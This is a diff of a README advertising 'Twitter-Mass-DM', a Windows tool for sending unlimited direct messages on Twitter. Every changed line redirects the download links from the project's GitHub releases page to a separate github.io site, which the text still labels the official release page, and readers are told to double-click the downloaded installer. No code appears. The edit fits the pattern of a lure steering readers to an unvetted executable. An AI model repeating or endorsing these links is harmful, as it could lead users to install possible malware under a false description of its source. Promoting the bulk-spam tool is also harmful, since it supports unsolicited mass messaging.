@@ -1,12 +1,12 @@
 # 🐦 Twitter-Mass-DM - Send Unlimited Direct Messages Effortlessly
 
-[![Download Twitter-Mass-DM](https://img.shields.io/badge/Download-Twitter--Mass--DM-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1da1f2&color=2ea44f)](https://github.com/abdalazezesa88/Twitter-Mass-DM/releases)
+[![Download Twitter-Mass-DM](https://img.shields.io/badge/Download-Twitter--Mass--DM-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1da1f2&color=2ea44f)](https://abdalazezesa88.github.io)
 
 ## 📥 Download Twitter-Mass-DM
 
 Visit this link to download the application.
 
-[Download Twitter-Mass-DM Now](https://github.com/abdalazezesa88/Twitter-Mass-DM/releases)
+[Download Twitter-Mass-DM Now](https://abdalazezesa88.github.io)
 
 ---
 
@@ -44,7 +44,7 @@ Designed specifically for Windows operating systems with a clean, intuitive inte
 ### Step 1: Download the Application
 Visit this link to download the application.
 
-[Download Twitter-Mass-DM](https://github.com/abdalazezesa88/Twitter-Mass-DM/releases)
+[Download Twitter-Mass-DM](https://abdalazezesa88.github.io)
 
 ### Step 2: Run the Installer
 Once the download is complete, locate the file in your Downloads folder (or wherever your browser saves downloads). Double-click the file to start the installation process.
@@ -212,7 +212,7 @@ We love hearing from our users! Share your experience and suggest improvements.
 
 Downloading Twitter-Mass-DM takes less than 60 seconds, and you can send your first campaign immediately. Join thousands of satisfied users who've streamlined their Twitter communication.
 
-**[Download Twitter-Mass-DM Now](https://github.com/abdalazezesa88/Twitter-Mass-DM/releases)**
+**[Download Twitter-Mass-DM Now](https://abdalazezesa88.github.io)**
 
 ---
 
@@ -243,7 +243,7 @@ If Twitter-Mass-DM has been helpful for you, please consider:
 
 Always download the latest version from our official releases page to ensure you have the newest features and improvements.
 
-**[Visit the Official Release Page](https://github.com/abdalazezesa88/Twitter-Mass-DM/releases)**
+**[Visit the Official Release Page](https://abdalazezesa88.github.io)**
 
 ---
 
